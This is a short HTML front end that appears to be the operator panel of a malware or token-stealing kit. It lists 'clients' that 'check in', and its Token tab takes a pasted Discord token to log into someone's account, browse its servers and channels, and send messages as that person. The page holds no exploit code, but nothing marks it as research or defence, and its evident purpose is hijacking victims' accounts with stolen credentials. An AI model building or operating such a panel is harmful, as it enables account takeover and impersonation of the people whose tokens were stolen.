<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>PANEL</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<div id="app">
  <aside id="sidebar">
    <div class="sbhead">
      <h1>PANEL</h1>
      <span class="sbstats" id="sbstats">0</span>
    </div>
    <div class="sbtabs">
      <button class="stab active" data-tab="clients" onclick="switchTab('clients')">Clients</button>
      <button class="stab" data-tab="token" onclick="switchTab('token')">Token</button>
    </div>
    <div id="tab-clients">
      <div class="sbsearch">
        <input type="text" id="search" placeholder="search clients..." oninput="onsearch()">
      </div>
      <div class="sbtoolbar">
        <button onclick="clearall()" title="clear all">clear</button>
      </div>
      <div id="clientlist"></div>
    </div>
    <div id="tab-token" style="display:none">
      <div class="sbtoolbar" style="padding:8px 10px;flex-direction:column;gap:6px;flex-shrink:0">
        <input type="text" id="tokenInput" placeholder="paste Discord token..." style="width:100%;padding:6px 8px;background:#12122a;border:1px solid #1a1a30;color:#ccc;border-radius:4px;outline:none;box-sizing:border-box" spellcheck="false">
        <button id="tokenLoginBtn" onclick="discordLogin()" style="width:100%;padding:6px;background:#5865f2;color:#fff;border:none;border-radius:4px;cursor:pointer">Connect</button>
        <div id="tokenStatus" style="font-size:11px;color:#666;text-align:center"></div>
      </div>
      <div id="dcGuildList" style="flex:1;overflow-y:auto;padding:4px 0"></div>
    </div>
  </aside>
  <main id="main">
    <div id="welcome">
      <div class="wicon">◈</div>
      <h2>waiting for data...</h2>
      <p>clients will appear here when they check in</p>
    </div>
    <div id="detail"></div>
    <div id="dcClient" style="display:none;height:100%;flex-direction:column">
      <div id="dcHeader" style="padding:12px 16px;border-bottom:1px solid #1a1a30;font-weight:700;font-size:15px;color:#e0e0ec;flex-shrink:0"></div>
      <div id="dcChannelList" style="padding:8px 0;border-bottom:1px solid #1a1a30;flex-shrink:0;overflow-x:auto;display:flex;gap:4px"></div>
      <div id="dcMessages" style="flex:1;overflow-y:auto;padding:12px 16px;font-size:13px;line-height:1.5"></div>
      <div id="dcInputArea" style="padding:8px 12px;border-top:1px solid #1a1a30;flex-shrink:0;display:none">
        <div style="display:flex;gap:8px">
          <input type="text" id="dcMsgInput" placeholder="Type a message..." style="flex:1;padding:8px 12px;background:#12122a;border:1px solid #1a1a30;color:#ccc;border-radius:4px;outline:none" onkeydown="if(event.key==='Enter')dcSendMsg()">
          <button onclick="dcSendMsg()" style="padding:8px 14px;background:#5865f2;color:#fff;border:none;border-radius:4px;cursor:pointer">Send</button>
        </div>
      </div>
    </div>
  </main>
</div>
<div id="toasts"></div>
<script src="script.js"></script>
</body>
</html>
